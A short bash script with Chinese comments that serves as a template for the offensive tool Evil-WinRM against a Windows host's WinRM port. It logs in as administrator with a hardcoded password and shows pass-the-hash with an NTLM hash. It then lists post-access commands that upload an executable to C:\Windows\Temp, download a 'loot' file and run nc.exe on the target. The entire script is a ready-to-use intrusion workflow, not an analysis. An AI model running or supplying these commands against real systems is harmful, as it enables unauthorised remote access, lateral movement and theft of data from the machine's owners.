#!/bin/bash
# Evil-WinRM WinRM 连接脚本（目标需开放 5985/5986 端口）

TARGET="192.168.1.100"
USER="administrator"
PASS="Password123!"
HASH="8846f7eaee8fb117ad06bdd830b7586c"

echo "[*] 使用密码连接"
evil-winrm -i ${TARGET} -u ${USER} -p ${PASS}

echo "[*] 使用哈希 PTH 连接"
# evil-winrm -i ${TARGET} -u ${USER} -H ${HASH}

echo "[*] 指定上传/下载目录"
# evil-winrm -i ${TARGET} -u ${USER} -p ${PASS} \
#     -s /path/to/ps_scripts \
#     -e /path/to/executables

# 连接后常用命令：
# upload /local/path/file.exe C:\Windows\Temp\file.exe
# download C:\Windows\Temp\loot.txt /local/path/
# menu                    # 查看可用模块
# Invoke-Binary ./nc.exe  # 执行二进制
